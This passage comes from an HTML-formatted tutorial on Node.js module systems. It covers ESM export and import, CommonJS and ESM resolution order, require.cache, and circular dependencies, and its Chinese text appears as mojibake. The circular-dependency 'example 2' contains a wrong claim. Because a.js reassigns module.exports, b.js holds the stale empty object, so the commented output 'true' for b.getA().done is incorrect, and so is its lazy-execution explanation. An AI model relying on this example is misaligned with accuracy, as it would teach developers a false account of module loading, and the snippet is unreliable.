  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">subtract</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-keyword">return</span> a - b;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14159</span>;

<span class="hljs-comment">// é»˜è®¤å¯¼å‡ºï¼ˆåªèƒ½æœ‰ä¸€ä¸ªï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
  <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) {
    <span class="hljs-keyword">return</span> a + b;
  }
}

<span class="hljs-comment">// æˆ–è€…å…ˆå®šä¹‰åå¯¼å‡º</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">multiply</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-keyword">return</span> a * b;
}

<span class="hljs-keyword">export</span> { multiply };

<span class="hljs-comment">// é‡å‘½åå¯¼å‡º</span>
<span class="hljs-keyword">export</span> { multiply <span class="hljs-keyword">as</span> mul };

<span class="hljs-comment">// å¯¼å‡ºæ‰€æœ‰ï¼ˆre-exportï¼‰</span>
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./other-module.mjs'</span>;
<span class="hljs-keyword">export</span> { specific } <span class="hljs-keyword">from</span> <span class="hljs-string">'./other-module.mjs'</span>;
</code></pre>
<h4 data-id="heading-13">å¯¼å…¥æ¨¡å—</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// app.mjs</span>

<span class="hljs-comment">// å‘½åå¯¼å…¥</span>
<span class="hljs-keyword">import</span> { add, subtract, <span class="hljs-variable constant_">PI</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./math.mjs'</span>;

<span class="hljs-comment">// é»˜è®¤å¯¼å…¥</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Calculator</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./math.mjs'</span>;

<span class="hljs-comment">// æ··åˆå¯¼å…¥</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Calculator</span>, { add, subtract } <span class="hljs-keyword">from</span> <span class="hljs-string">'./math.mjs'</span>;

<span class="hljs-comment">// å¯¼å…¥æ‰€æœ‰ï¼ˆå‘½åç©ºé—´å¯¼å…¥ï¼‰</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> math <span class="hljs-keyword">from</span> <span class="hljs-string">'./math.mjs'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>));

<span class="hljs-comment">// é‡å‘½åå¯¼å…¥</span>
<span class="hljs-keyword">import</span> { add <span class="hljs-keyword">as</span> sum } <span class="hljs-keyword">from</span> <span class="hljs-string">'./math.mjs'</span>;

<span class="hljs-comment">// ä»…æ‰§è¡Œæ¨¡å—ï¼ˆä¸å¯¼å…¥ä»»ä½•å†…å®¹ï¼‰</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./initialize.mjs'</span>;

<span class="hljs-comment">// åŠ¨æ€å¯¼å…¥ï¼ˆè¿”å› Promiseï¼‰</span>
<span class="hljs-keyword">const</span> math = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./math.mjs'</span>);
<span class="hljs-keyword">const</span> { add } = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./math.mjs'</span>);

<span class="hljs-comment">// æ¡ä»¶åŠ¨æ€å¯¼å…¥</span>
<span class="hljs-keyword">if</span> (condition) {
  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./module.mjs'</span>);
}
</code></pre>
<h3 data-id="heading-14">ESM çš„ç‰¹ç‚¹</h3>
<ol>
<li><strong>é™æ€åˆ†æ</strong>ï¼š<code>import</code> å’Œ <code>export</code> è¯­å¥åœ¨ç¼–è¯‘æ—¶è¢«åˆ†æ</li>
<li><strong>å¼‚æ­¥åŠ è½½</strong>ï¼šESM æ”¯æŒé¡¶å±‚ <code>await</code></li>
<li><strong>ä¸¥æ ¼æ¨¡å¼</strong>ï¼šESM æ¨¡å—é»˜è®¤åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹è¿è¡Œ</li>
<li><strong>æ–‡ä»¶æ‰©å±•åå¿…éœ€</strong>ï¼šå¯¼å…¥æœ¬åœ°æ¨¡å—æ—¶å¿…é¡»åŒ…å«æ–‡ä»¶æ‰©å±•å</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âœ… æ­£ç¡®</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">'./math.mjs'</span>;

<span class="hljs-comment">// âŒ é”™è¯¯ï¼ˆç¼ºå°‘æ‰©å±•åï¼‰</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">'./math'</span>;
</code></pre>
<hr/>
<h2 data-id="heading-15">æ¨¡å—æŸ¥æ‰¾æœºåˆ¶</h2>
<h3 data-id="heading-16">CommonJS æ¨¡å—æŸ¥æ‰¾æœºåˆ¶</h3>
<p>å½“ä½¿ç”¨ <code>require('module-name')</code> æ—¶ï¼ŒNode.js æŒ‰ä»¥ä¸‹é¡ºåºæŸ¥æ‰¾æ¨¡å—ï¼š</p>
<h4 data-id="heading-17">1. å†…ç½®æ¨¡å—ï¼ˆCore Modulesï¼‰</h4>
<p>é¦–å…ˆæ£€æŸ¥æ˜¯å¦ä¸º Node.js å†…ç½®æ¨¡å—ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);        <span class="hljs-comment">// å†…ç½®æ¨¡å—</span>
<span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">'http'</span>);    <span class="hljs-comment">// å†…ç½®æ¨¡å—</span>
<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);    <span class="hljs-comment">// å†…ç½®æ¨¡å—</span>
</code></pre>
<h4 data-id="heading-18">2. æ–‡ä»¶æˆ–ç›®å½•æ¨¡å—</h4>
<p>å¦‚æœæä¾›äº†ç›¸å¯¹è·¯å¾„ï¼ˆ<code>./</code> æˆ– <code>../</code>ï¼‰æˆ–ç»å¯¹è·¯å¾„ï¼ˆ<code>/</code>ï¼‰ï¼ŒNode.js ä¼šæŸ¥æ‰¾å¯¹åº”çš„æ–‡ä»¶æˆ–ç›®å½•ï¼š</p>
<p><strong>æ–‡ä»¶æŸ¥æ‰¾é¡ºåº</strong>ï¼š</p>
<ol>
<li>ç²¾ç¡®åŒ¹é…ï¼š<code>require('./math')</code> â†’ <code>math</code></li>
<li>æ·»åŠ  <code>.js</code>ï¼š<code>require('./math')</code> â†’ <code>math.js</code></li>
<li>æ·»åŠ  <code>.json</code>ï¼š<code>require('./math')</code> â†’ <code>math.json</code></li>
<li>æ·»åŠ  <code>.node</code>ï¼š<code>require('./math')</code> â†’ <code>math.node</code>ï¼ˆåŸç”Ÿæ‰©å±•ï¼‰</li>
</ol>
<p><strong>ç›®å½•æŸ¥æ‰¾é¡ºåº</strong>ï¼š</p>
<ol>
<li>æŸ¥æ‰¾ <code>package.json</code> ä¸­çš„ <code>main</code> å­—æ®µ</li>
<li>æŸ¥æ‰¾ <code>index.js</code></li>
<li>æŸ¥æ‰¾ <code>index.json</code></li>
<li>æŸ¥æ‰¾ <code>index.node</code></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç¤ºä¾‹ç›®å½•ç»“æ„</span>
<span class="hljs-comment">// my-module/</span>
<span class="hljs-comment">//   â”œâ”€â”€ package.json (main: "lib/index.js")</span>
<span class="hljs-comment">//   â”œâ”€â”€ index.js</span>
<span class="hljs-comment">//   â””â”€â”€ lib/</span>
<span class="hljs-comment">//       â””â”€â”€ index.js</span>

<span class="hljs-keyword">const</span> myModule = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./my-module'</span>); <span class="hljs-comment">// åŠ è½½ lib/index.js</span>
</code></pre>
<h4 data-id="heading-19">3. node_modules ç›®å½•æŸ¥æ‰¾</h4>
<p>å¦‚æœå‰ä¸¤æ­¥éƒ½æ²¡æœ‰æ‰¾åˆ°ï¼ŒNode.js ä¼šåœ¨ <code>node_modules</code> ç›®å½•ä¸­æŸ¥æ‰¾ï¼š</p>
<p><strong>æŸ¥æ‰¾é¡ºåº</strong>ï¼š</p>
<ol>
<li>å½“å‰ç›®å½•çš„ <code>node_modules</code></li>
<li>çˆ¶ç›®å½•çš„ <code>node_modules</code></li>
<li>ç»§ç»­å‘ä¸ŠæŸ¥æ‰¾ï¼Œç›´åˆ°æ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é¡¹ç›®ç»“æ„</span>
<span class="hljs-comment">// /home/user/project/</span>
<span class="hljs-comment">//   â”œâ”€â”€ node_modules/        â† ç¬¬1ä¼˜å…ˆçº§</span>
<span class="hljs-comment">//   â”‚   â””â”€â”€ express/</span>
<span class="hljs-comment">//   â”œâ”€â”€ src/</span>
<span class="hljs-comment">//   â”‚   â”œâ”€â”€ node_modules/   â† ç¬¬2ä¼˜å…ˆçº§</span>
<span class="hljs-comment">//   â”‚   â”‚   â””â”€â”€ lodash/</span>
<span class="hljs-comment">//   â”‚   â””â”€â”€ app.js</span>
<span class="hljs-comment">//   â””â”€â”€ package.json</span>

<span class="hljs-comment">// åœ¨ src/app.js ä¸­</span>
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);  <span class="hljs-comment">// æŸ¥æ‰¾ /home/user/project/node_modules/express</span>
<span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lodash'</span>);    <span class="hljs-comment">// æŸ¥æ‰¾ /home/user/project/src/node_modules/lodash</span>
</code></pre>
<h4 data-id="heading-20">4. æ¨¡å—è·¯å¾„ç¼“å­˜</h4>
<p>Node.js ä¼šç¼“å­˜æ¨¡å—è·¯å¾„çš„è§£æç»“æœï¼Œæé«˜åç»­æŸ¥æ‰¾é€Ÿåº¦ã€‚</p>
<h3 data-id="heading-21">ESM æ¨¡å—æŸ¥æ‰¾æœºåˆ¶</h3>
<p>ESM çš„æ¨¡å—æŸ¥æ‰¾æœºåˆ¶ä¸ CommonJS ç±»ä¼¼ï¼Œä½†æœ‰ä»¥ä¸‹åŒºåˆ«ï¼š</p>
<h4 data-id="heading-22">1. æ–‡ä»¶æ‰©å±•åå¿…éœ€</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âœ… æ­£ç¡®</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">'./math.mjs'</span>;
<span class="hljs-keyword">import</span> { utils } <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils.js'</span>;

<span class="hljs-comment">// âŒ é”™è¯¯</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">'./math'</span>;
</code></pre>
<h4 data-id="heading-23">2. ç›®å½•æŸ¥æ‰¾</h4>
<p>ESM æŸ¥æ‰¾ç›®å½•æ—¶ï¼Œä¼šæŸ¥æ‰¾ï¼š</p>
<ol>
<li><code>package.json</code> ä¸­çš„ <code>exports</code> å­—æ®µï¼ˆä¼˜å…ˆï¼‰</li>
<li><code>package.json</code> ä¸­çš„ <code>main</code> å­—æ®µ</li>
<li><code>index.mjs</code> æˆ– <code>index.js</code>ï¼ˆå–å†³äº <code>package.json</code> ä¸­çš„ <code>type</code>ï¼‰</li>
</ol>
<h4 data-id="heading-24">3. package.json çš„ <code>exports</code> å­—æ®µ</h4>
<p><code>exports</code> å­—æ®µæä¾›äº†æ›´ç²¾ç¡®çš„æ¨¡å—å¯¼å‡ºæ§åˆ¶ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-package"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"module"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"exports"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"."</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./index.js"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"./utils"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./utils.js"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"./package.json"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./package.json"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">import</span> pkg <span class="hljs-keyword">from</span> <span class="hljs-string">'my-package'</span>;
<span class="hljs-keyword">import</span> utils <span class="hljs-keyword">from</span> <span class="hljs-string">'my-package/utils'</span>;
</code></pre>
<h4 data-id="heading-25">4. ç›¸å¯¹è·¯å¾„è§£æ</h4>
<p>ESM è¦æ±‚ä½¿ç”¨æ˜ç¡®çš„ç›¸å¯¹è·¯å¾„ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âœ… æ­£ç¡®</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">'./math.mjs'</span>;
<span class="hljs-keyword">import</span> { utils } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/index.mjs'</span>;

<span class="hljs-comment">// âŒ é”™è¯¯</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">'math'</span>;
</code></pre>
<h3 data-id="heading-26">æ¨¡å—æŸ¥æ‰¾ç¤ºä¾‹</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// CommonJS</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">'./math'</span>);           <span class="hljs-comment">// æŸ¥æ‰¾ ./math.js</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">'./math.js'</span>);        <span class="hljs-comment">// ç›´æ¥åŠ è½½ ./math.js</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);          <span class="hljs-comment">// æŸ¥æ‰¾ node_modules/express</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">'/absolute/path'</span>);   <span class="hljs-comment">// ç»å¯¹è·¯å¾„</span>

<span class="hljs-comment">// ESM</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./math.mjs'</span>;         <span class="hljs-comment">// å¿…é¡»åŒ…å«æ‰©å±•å</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'express'</span>;            <span class="hljs-comment">// æŸ¥æ‰¾ node_modules/express</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'/absolute/path.mjs'</span>; <span class="hljs-comment">// ç»å¯¹è·¯å¾„</span>
</code></pre>
<hr/>
<h2 data-id="heading-27">æ¨¡å—ç¼“å­˜æœºåˆ¶</h2>
<h3 data-id="heading-28">CommonJS æ¨¡å—ç¼“å­˜</h3>
<p>Node.js ä¼šç¼“å­˜æ‰€æœ‰å·²åŠ è½½çš„æ¨¡å—ï¼Œä»¥æé«˜æ€§èƒ½ã€‚æ¯ä¸ªæ¨¡å—åªæ‰§è¡Œä¸€æ¬¡ï¼Œåç»­çš„ <code>require</code> è°ƒç”¨ä¼šè¿”å›ç¼“å­˜çš„ç»“æœã€‚</p>
<h4 data-id="heading-29">ç¼“å­˜çš„å·¥ä½œåŸç†</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// moduleA.js</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Module A è¢«åŠ è½½'</span>);
<span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">increment</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    count++;
    <span class="hljs-keyword">return</span> count;
  },
  <span class="hljs-attr">getCount</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> count;
  }
};

<span class="hljs-comment">// app.js</span>
<span class="hljs-keyword">const</span> moduleA1 = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./moduleA'</span>);  <span class="hljs-comment">// è¾“å‡º: "Module A è¢«åŠ è½½"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(moduleA1.<span class="hljs-title function_">getCount</span>());        <span class="hljs-comment">// 0</span>

<span class="hljs-keyword">const</span> moduleA2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./moduleA'</span>);  <span class="hljs-comment">// æ— è¾“å‡ºï¼Œä½¿ç”¨ç¼“å­˜</span>
moduleA1.<span class="hljs-title function_">increment</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(moduleA2.<span class="hljs-title function_">getCount</span>());        <span class="hljs-comment">// 1ï¼ˆå…±äº«åŒä¸€ä¸ªå®ä¾‹ï¼‰</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(moduleA1 === moduleA2);     <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-30">ç¼“å­˜çš„å­˜å‚¨ä½ç½®</h4>
<p>æ¨¡å—ç¼“å­˜å­˜å‚¨åœ¨ <code>require.cache</code> å¯¹è±¡ä¸­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æŸ¥çœ‹ç¼“å­˜</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">require</span>.<span class="hljs-property">cache</span>);

<span class="hljs-comment">// åˆ é™¤ç¼“å­˜ï¼ˆä¸æ¨èï¼Œä»…ç”¨äºæµ‹è¯•ï¼‰</span>
<span class="hljs-keyword">delete</span> <span class="hljs-built_in">require</span>.<span class="hljs-property">cache</span>[<span class="hljs-built_in">require</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'./moduleA'</span>)];
<span class="hljs-keyword">const</span> moduleA = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./moduleA'</span>); <span class="hljs-comment">// é‡æ–°åŠ è½½</span>
</code></pre>
<h4 data-id="heading-31">ç¼“å­˜çš„å½±å“</h4>
<ol>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šé¿å…é‡å¤åŠ è½½å’Œæ‰§è¡Œæ¨¡å—</li>
<li><strong>å•ä¾‹æ¨¡å¼</strong>ï¼šå¤©ç„¶æ”¯æŒå•ä¾‹æ¨¡å¼</li>
<li><strong>çŠ¶æ€å…±äº«</strong>ï¼šæ¨¡å—çš„çŠ¶æ€åœ¨æ‰€æœ‰å¼•ç”¨ä¹‹é—´å…±äº«</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// counter.jsï¼ˆå•ä¾‹ç¤ºä¾‹ï¼‰</span>
<span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> ++count,
  <span class="hljs-attr">decrement</span>: <span class="hljs-function">() =&gt;</span> --count,
  <span class="hljs-attr">getCount</span>: <span class="hljs-function">() =&gt;</span> count
};

<span class="hljs-comment">// app.js</span>
<span class="hljs-keyword">const</span> counter1 = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./counter'</span>);
<span class="hljs-keyword">const</span> counter2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./counter'</span>);

counter1.<span class="hljs-title function_">increment</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter2.<span class="hljs-title function_">getCount</span>()); <span class="hljs-comment">// 1ï¼ˆå…±äº«çŠ¶æ€ï¼‰</span>
</code></pre>
<h3 data-id="heading-32">ESM æ¨¡å—ç¼“å­˜</h3>
<p>ESM ä¹Ÿæœ‰æ¨¡å—ç¼“å­˜æœºåˆ¶ï¼Œä½†å®ç°æ–¹å¼ä¸åŒï¼š</p>
<ol>
<li><strong>æ¨¡å—å›¾ç¼“å­˜</strong>ï¼šESM åœ¨è§£æé˜¶æ®µæ„å»ºæ¨¡å—å›¾å¹¶ç¼“å­˜</li>
<li><strong>å®ä¾‹ç¼“å­˜</strong>ï¼šæ¯ä¸ªæ¨¡å—åªå®ä¾‹åŒ–ä¸€æ¬¡</li>
<li><strong>ä¸å¯æ¸…é™¤</strong>ï¼šESM çš„ç¼“å­˜ä¸èƒ½åƒ CommonJS é‚£æ ·æ‰‹åŠ¨æ¸…é™¤</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// math.mjs</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Module loaded'</span>);
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> value = <span class="hljs-number">42</span>;

<span class="hljs-comment">// app.mjs</span>
<span class="hljs-keyword">import</span> { value <span class="hljs-keyword">as</span> v1 } <span class="hljs-keyword">from</span> <span class="hljs-string">'./math.mjs'</span>;  <span class="hljs-comment">// è¾“å‡º: "Module loaded"</span>
<span class="hljs-keyword">import</span> { value <span class="hljs-keyword">as</span> v2 } <span class="hljs-keyword">from</span> <span class="hljs-string">'./math.mjs'</span>;  <span class="hljs-comment">// æ— è¾“å‡ºï¼Œä½¿ç”¨ç¼“å­˜</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(v1 === v2); <span class="hljs-comment">// true</span>
</code></pre>
<hr/>
<h2 data-id="heading-33">å¾ªç¯ä¾èµ–å¤„ç†</h2>
<p>å¾ªç¯ä¾èµ–æ˜¯æŒ‡ä¸¤ä¸ªæˆ–å¤šä¸ªæ¨¡å—ç›¸äº’ä¾èµ–ï¼Œå½¢æˆå¾ªç¯å¼•ç”¨çš„æƒ…å†µã€‚</p>
<h3 data-id="heading-34">CommonJS ä¸­çš„å¾ªç¯ä¾èµ–</h3>
<p>åœ¨ CommonJS ä¸­ï¼Œå¾ªç¯ä¾èµ–çš„å¤„ç†æ–¹å¼å¯èƒ½å¯¼è‡´æ„å¤–çš„è¡Œä¸ºã€‚</p>
<h4 data-id="heading-35">ç¤ºä¾‹ 1ï¼šåŸºæœ¬å¾ªç¯ä¾èµ–</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// a.js</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'a.js å¼€å§‹æ‰§è¡Œ'</span>);
<span class="hljs-keyword">const</span> b = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./b'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'a.js ä¸­ï¼Œb.done ='</span>, b.<span class="hljs-property">done</span>);
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">done</span> = <span class="hljs-literal">true</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'a.js æ‰§è¡Œå®Œæ¯•'</span>);

<span class="hljs-comment">// b.js</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'b.js å¼€å§‹æ‰§è¡Œ'</span>);
<span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./a'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'b.js ä¸­ï¼Œa.done ='</span>, a.<span class="hljs-property">done</span>);
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">done</span> = <span class="hljs-literal">true</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'b.js æ‰§è¡Œå®Œæ¯•'</span>);

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./a'</span>);
<span class="hljs-keyword">const</span> b = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./b'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'åœ¨ main.js ä¸­ï¼Œa.done ='</span>, a.<span class="hljs-property">done</span>, <span class="hljs-string">'b.done ='</span>, b.<span class="hljs-property">done</span>);
</code></pre>
<p><strong>æ‰§è¡Œç»“æœ</strong>ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.js</span> å¼€å§‹æ‰§è¡Œ
<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.js</span> å¼€å§‹æ‰§è¡Œ
<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.js</span> ä¸­ï¼Œ<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.done</span> = undefined
<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.js</span> æ‰§è¡Œå®Œæ¯•
<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.js</span> ä¸­ï¼Œ<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.done</span> = true
<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.js</span> æ‰§è¡Œå®Œæ¯•
åœ¨ <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.js</span> ä¸­ï¼Œ<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.done</span> = true <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.done</span> = true
</code></pre>
<p><strong>åŸå› åˆ†æ</strong>ï¼š</p>
<ol>
<li><code>a.js</code> å¼€å§‹æ‰§è¡Œï¼Œé‡åˆ° <code>require('./b')</code></li>
<li><code>b.js</code> å¼€å§‹æ‰§è¡Œï¼Œé‡åˆ° <code>require('./a')</code></li>
<li>æ­¤æ—¶ <code>a.js</code> è¿˜æœªæ‰§è¡Œå®Œï¼Œ<code>module.exports</code> æ˜¯ç©ºå¯¹è±¡ <code>{}</code></li>
<li><code>b.js</code> è·å¾—çš„æ˜¯ <code>a.js</code> çš„éƒ¨åˆ†å¯¼å‡ºï¼ˆç©ºå¯¹è±¡ï¼‰</li>
<li><code>b.js</code> æ‰§è¡Œå®Œæ¯•ï¼Œå¯¼å‡º <code>{ done: true }</code></li>
<li><code>a.js</code> ç»§ç»­æ‰§è¡Œï¼Œè·å¾—å®Œæ•´çš„ <code>b.js</code> å¯¼å‡º</li>
</ol>
<h4 data-id="heading-36">ç¤ºä¾‹ 2ï¼šå‡½æ•°å¯¼å‡ºï¼ˆå»¶è¿Ÿæ‰§è¡Œï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// a.js</span>
<span class="hljs-keyword">const</span> b = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./b'</span>);

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">getB</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> b;
  },
  <span class="hljs-attr">done</span>: <span class="hljs-literal">true</span>
};

<span class="hljs-comment">// b.js</span>
<span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./a'</span>);

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">getA</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> a;  <span class="hljs-comment">// æ­¤æ—¶ a å¯èƒ½è¿˜æ˜¯ç©ºå¯¹è±¡</span>
  },
  <span class="hljs-attr">done</span>: <span class="hljs-literal">true</span>
};

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./a'</span>);
<span class="hljs-keyword">const</span> b = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./b'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-title function_">getB</span>().<span class="hljs-property">done</span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b.<span class="hljs-title function_">getA</span>().<span class="hljs-property">done</span>);  <span class="hljs-comment">// trueï¼ˆå› ä¸ºå‡½æ•°å»¶è¿Ÿæ‰§è¡Œï¼‰</span>
</code></pre>
<h4 data-id="heading-37">é¿å…å¾ªç¯ä¾èµ–çš„æœ€ä½³å®è·µ</h4>
<ol>
<li><strong>é‡æ„ä»£ç ç»“æ„</strong>ï¼šæå–å…¬å…±åŠŸèƒ½åˆ°ç‹¬ç«‹æ¨¡å—</li>
<li><strong>å»¶è¿Ÿå¼•ç”¨</strong>ï¼šåœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨ <code>require</code></li>
